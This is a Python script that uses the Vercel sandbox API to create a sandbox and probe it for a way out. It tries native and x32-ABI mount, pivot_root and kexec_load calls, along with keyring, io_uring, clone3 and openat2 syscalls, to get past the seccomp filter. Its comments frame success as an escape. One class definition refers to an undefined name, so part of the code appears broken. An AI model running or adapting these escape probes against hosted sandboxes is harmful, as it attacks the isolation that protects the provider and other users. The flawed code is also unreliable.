# 实验J172: seccomp 边界分析 + x32 ABI 绕过测试 + 新syscall面探测
# 动机: 沙箱进程 uid1000+全cap 但 mount 被拒 -> 边界是 seccomp filter
#       x32 ABI (0x40000000+号) 若 seccomp 未检查 arch -> 可绕过过滤器执行 mount = 逃逸级
# 顺序: A基线探测(低风险) -> B x32 mount (观察错误码) -> C keyring/io_uring/clone3/openat2
# 全部写文件读回, 分步执行避免一步被杀丢全部
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=280):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    for attempt in range(4):
        c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
        if c == 200:
            break
        print(f"  retry[{attempt}] status {c}: {r[:150]}", flush=True)
        if c == 410 or "sandbox_stopped" in r:
            print(f"  SANDBOX_DEAD at cmd[{label}]", flush=True)
            return "DEAD"
        time.sleep(3)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return "DEAD" if "sandbox_stopped" in r else ""
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)
    return ""

def catfile(sid, path, label, n=4000):
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}",
               {"command": "cat", "args": [path], "wait": True, "logs": True, "timeout": 100})
    print(f"=== {label} status {c} ===", flush=True)
    print(r[:n], flush=True)
    return c

NAME = "expj172"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
if c != 200:
    print(r[:400])
    sys.exit(1)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

# 阶段A: 基线 - seccomp状态/mount错误码/keyctl/io_uring/clone3/openat2 可用性
PA = r'''
import os, ctypes, errno
out = open("/tmp/d172a.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()

libc = ctypes.CDLL("libc.so.6", use_errno=True)

def syscall(n, *args):
    r = libc.syscall(n, *args)
    e = ctypes.get_errno()
    return r, e

# 1. seccomp 状态
with open("/proc/self/status") as f:
    for line in f:
        if line.startswith(("Seccomp", "CapEff", "CapBnd", "NoNewPrivs")):
            p("status", line.strip())

# 2. 普通 mount (x86_64 #165): 观察错误
os.makedirs("/tmp/m1", exist_ok=True)
r, e = syscall(165, b"none", b"/tmp/m1", b"tmpfs", 0, b"")
p("mount165", r, "errno", e, os.strerror(e) if e else "OK")

# 3. x32 mount (0x40000000|165): 观察错误
r, e = syscall(0x40000000 | 165, b"none", b"/tmp/m1", b"tmpfs", 0, b"")
p("mount_x32", r, "errno", e, os.strerror(e) if e else "OK")

# 4. keyring: add_key #248 (需要 cap; 全cap环境下通常可用)
#    add_key(const char *type, const char *desc, const void *payload, size_t plen, key_serial_t ring)
KEY_SPEC_PROCESS_KEYRING = -2
r, e = syscall(248, b"user", b"t172", b"x", 1, KEY_SPEC_PROCESS_KEYRING)
p("add_key248", r, "errno", e, os.strerror(e) if e else "OK")

# 5. io_uring_setup #425
class IOUR(params):
    pass
r, e = syscall(425, 8, 0)
p("io_uring_setup425", r, "errno", e, os.strerror(e) if e else "OK")
if r >= 0:
    os.close(r)

# 6. clone3 #435 (flags=0 等同 clone; 观察是否被seccomp杀)
r, e = syscall(435, 0, 0)
p("clone3_435", r, "errno", e, os.strerror(e) if e else "OK")

# 7. openat2 #437 (观察可用性; 成功会返回fd)
r, e = syscall(437, -100, b"/etc/hostname", 0, 0)
p("openat2_437", r, "errno", e, os.strerror(e) if e else "OK")
if r >= 0:
    os.close(r)

# 8. unshare 对照 (已知可用 j108)
r, e = syscall(272, 0)
p("unshare272_0", r, "errno", e, os.strerror(e) if e else "OK")
p("=== A_DONE")
out.close()
'''

# 阶段B: x32 更多验证 - 若 mount_x32 返回非ENOSYS则有戏; 测 x32 的其他禁号 + 直接内联汇编确认
PB = r'''
import os, ctypes
out = open("/tmp/d172b.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
libc = ctypes.CDLL("libc.so.6", use_errno=True)
def syscall(n, *args):
    r = libc.syscall(n, *args)
    return r, ctypes.get_errno()

# x32 常见禁号测试 (若 x32 通道存在, 这些应与 x86_64 行为一致)
# 165=mount 0x40000000|165 已在A测
for name, num, args in [
    ("x32_mount_again", 0x40000000 | 165, (b"none", b"/tmp/m1", b"tmpfs", 0, b"")),
    ("x32_pivot_root", 0x40000000 | 155, (b"/tmp/m1", b"/tmp/m1")),
    ("x32_kexec_load", 0x40000000 | 246, (0, 0, 0, 0, 0)),
]:
    r, e = syscall(num, *args)
    p(name, r, "errno", e, os.strerror(e) if e else "OK")
p("=== B_DONE")
out.close()
'''

# 阶段C: 若A显示 keyring 可用 -> keyring 面开启标记 (不做攻击, 只记录)
PC = r'''
import os
out = open("/tmp/d172c.txt", "w")
def p(*a):
    out.write(" ".join(str(x) for x in a) + "\n")
    out.flush()
# 检查 /proc/self/status 中完整 seccomp 上下文 + seccomp 过滤器数量
with open("/proc/self/status") as f:
    for line in f:
        if "Seccomp" in line or "Cap" in line:
            p(line.strip())
# /proc/self/syscall 当前 syscall
try:
    with open("/proc/self/syscall") as f:
        p("syscall_now", f.read().strip())
except Exception as e:
    p("syscall_err", repr(e))
p("=== C_DONE")
out.close()
'''

steps = [
    ("base-probe", "/tmp/d172a.txt", PA),
    ("x32-more", "/tmp/d172b.txt", PB),
    ("status-check", "/tmp/d172c.txt", PC),
]
for label, marker, code in steps:
    st = run_cmd(sid, code, label, timeout=120)
    time.sleep(2)
    cf = catfile(sid, marker, f"marker[{label}]", 4000)
    if st == "DEAD" or cf == 410:
        print(f"\n!!! DEATH after cmd[{label}] -> trigger = {label}", flush=True)
        break

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
